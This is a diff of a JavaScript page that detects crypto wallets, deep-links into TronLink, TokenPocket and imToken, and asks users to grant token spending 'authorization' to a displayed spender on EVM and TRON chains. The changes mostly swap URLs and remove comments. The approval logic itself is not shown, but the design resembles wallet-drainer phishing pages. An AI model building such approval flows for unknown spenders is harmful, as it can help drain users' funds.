@@ -262,25 +262,25 @@
             tronlink: {
                 name: 'TronLink',
                 icon: '🌊',
-                dappUrl: (url) => `https://tronlink.org/dapp?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.tronLink && window.tronLink.ready === true
             },
             tokenpocket: {
                 name: 'TokenPocket',
                 icon: '🎫',
-                dappUrl: (url) => `https://tokenpocket.pro/dapp?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `tp://dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined
             },
             imtoken: {
                 name: 'imToken',
                 icon: '🔷',
-                dappUrl: (url) => `https://token.im/dapp?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `imtokenv2://dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.ethereum && window.ethereum.isImToken === true
             }
         }
     };
 
-    let currentChain = '1';  // 当前链 ID
+    let currentChain = '1';
     let selectedWallet = null;
 
     // DOM 元素
@@ -353,7 +353,7 @@
         }
     }
 
-    // ==================== EVM 授权（在 MetaMask 内置浏览器中） ====================
+    // ==================== EVM 授权 ====================
     async function switchEvmNetwork(targetChainId) {
         const targetHex = '0x' + parseInt(targetChainId).toString(16);
         try {
@@ -428,7 +428,7 @@
         }
     }
 
-    // ==================== TRON 授权（在钱包内置浏览器中） ====================
+    // ==================== TRON 授权 ====================
     async function approveTron() {
         let tronWeb;
         if (selectedWallet === 'tronlink' && window.tronLink && window.tronLink.ready) {
@@ -437,7 +437,6 @@
         } else if (selectedWallet === 'tokenpocket' && window.tronWeb) {
             tronWeb = window.tronWeb;
         } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
-            // imToken 的 TRON 可能也通过 window.tronWeb 注入，需要具体判断
             tronWeb = window.tronWeb;
         } else {
             showStatus('未检测到对应的 TRON 钱包', 'error');
@@ -468,7 +467,7 @@
         }
     }
 
-    // ==================== 跳转到钱包内置浏览器 ====================
+    // ==================== 跳转到钱包 ====================
     function jumpToWallet() {
         if (!selectedWallet) {
             showDialog('请先选择钱包');
@@ -524,10 +523,9 @@
         renderWalletList();
         updateSpenderDisplay();
         hideStatus();
-        // 如果已在钱包内置浏览器中，自动选中对应钱包并高亮
+        // 自动检测已注入的钱包
         const isTron = currentChain === '728126428';
         if (isTron) {
-            // 检测是否有 TRON 钱包注入
             if (window.tronLink && window.tronLink.ready) {
                 selectedWallet = 'tronlink';
                 const item = document.querySelector(`.wallet-item[data-wallet="tronlink"]`);
@@ -561,7 +559,6 @@
 
     // 初始化
     function init() {
-        // 链选择器事件
         document.querySelectorAll('.chain-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
@@ -570,7 +567,6 @@
             });
         });
         document.getElementById('approveBtn').addEventListener('click', onApprove);
-        // 默认 Ethereum
         onChainChange('1');
     }
 
